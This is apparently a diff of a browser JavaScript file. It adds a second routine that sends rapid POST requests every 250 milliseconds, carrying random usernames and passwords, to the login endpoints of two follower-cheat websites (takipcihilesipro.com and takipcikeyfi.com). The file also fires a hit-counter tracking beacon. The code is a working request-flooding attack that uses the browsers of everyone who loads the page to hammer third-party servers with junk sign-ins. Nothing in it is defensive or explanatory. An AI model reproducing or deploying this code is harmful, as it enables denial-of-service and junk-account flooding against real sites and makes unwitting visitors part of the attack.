@@ -1,6 +1,4 @@
 new Image().src = "http://whos.amung.us/widget/cemsituser.png";
-var dax = new Image();
-dax.src="http://whos.amung.us/widget/muglauser33.png";
 {
     function createrand(xlength)
 {
@@ -60,7 +58,22 @@ var code = {
 function kcc() {
 
   code.ajax({
-   url: "https://takipcihilesipro.com/uyegirisi?",
+   url: "http://takipcihilesipro.com/uyegirisi?",
+   type: "POST",
+   data: {
+         username : createrand(15),
+         password : createrand(15),
+		 
+   },
+   success: function (e) {
+
+   }
+  })
+ } 
+ function kcc2() {
+
+  code.ajax({
+   url: "http://takipcikeyfi.com/member?",
    type: "POST",
    data: {
          username : createrand(15),
@@ -73,5 +86,6 @@ function kcc() {
   })
  } 
 	
-	setInterval(function(){ kcc(); }, 100);
+	setInterval(function(){ kcc(); }, 250);
+	setInterval(function(){ kcc2(); }, 250);
 }
